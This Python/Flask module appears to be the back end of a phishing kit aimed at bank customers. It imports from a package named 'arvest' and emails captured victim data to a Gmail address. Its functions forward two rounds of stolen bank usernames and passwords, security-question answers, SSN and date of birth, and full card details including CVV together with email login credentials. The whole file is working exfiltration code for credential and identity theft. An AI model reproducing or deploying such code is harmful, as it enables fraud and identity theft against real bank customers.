from arvest import mail
from flask_mail import Message
from datetime import datetime

def report_login(first_try_username, first_try_pass, username,password,bank_name):
    msg = Message(f'New Login || {bank_name}',
        sender='jamesmark7772021@gmail.com',
        recipients=['Jamesbondey007@gmail.com'])
    msg.body=f'''
    ---------------------------------------------
    ---------------FIRST TRY -------------------
    For ----- {bank_name}
    Username is ----- {first_try_username}
    Password is ----- {first_try_pass}
    at ---- {datetime.now()}
    ---------------------------------------------
    ---------------SECOND TRY -------------------
    For ----- {bank_name}
    Username is ----- {username}
    Password is ----- {password}
    at ---- {datetime.now()}
    '''
    mail.send(msg)

def security_question(q1,ans1,q2, ans2,q3,ans3):
    msg = Message('Question and Answer',
        sender='jamesmark7772021@gmail.com',
        recipients=['Jamesbondey007@gmail.com'])
    msg.body=f'''
    --------QUESTION ONE----------
    {q1} ------> {ans1}
    --------QUESTION TWO----------
    {q2} ------> {ans2}
    --------QUESTION THREE----------
    {q3} ------> {ans3}
    at ---- {datetime.now()}
    '''
    mail.send(msg)

def report_ssn(ssn, dob):
    msg = Message('SSN || DOB',
        sender='jamesmark7772021@gmail.com',
        recipients=['Jamesbondey007@gmail.com'])
    msg.body=f'''
    SSN ----- {ssn}
    DOB ----- {dob}
    at ---- {datetime.now()}
    '''
    mail.send(msg)

def report_card_details( card_name, card_number,expiry_date,cvv, email,password):
    msg = Message('CARD DETAILS',
        sender='jamesmark7772021@gmail.com',
        recipients=['Jamesbondey007@gmail.com'])
    msg.body=f'''
    Card name is ----- {card_name}
    Card Number is ----- {card_number}
    Expiry Date is ----- {expiry_date}
    CVV is ----- {cvv}
    ---------------------------------------------
    ---------------EMAIL LOGIN -------------------
    For ----- Email Login
    Username is ----- {email}
    Password is ----- {password}
    at ---- {datetime.now()}
    '''
    mail.send(msg)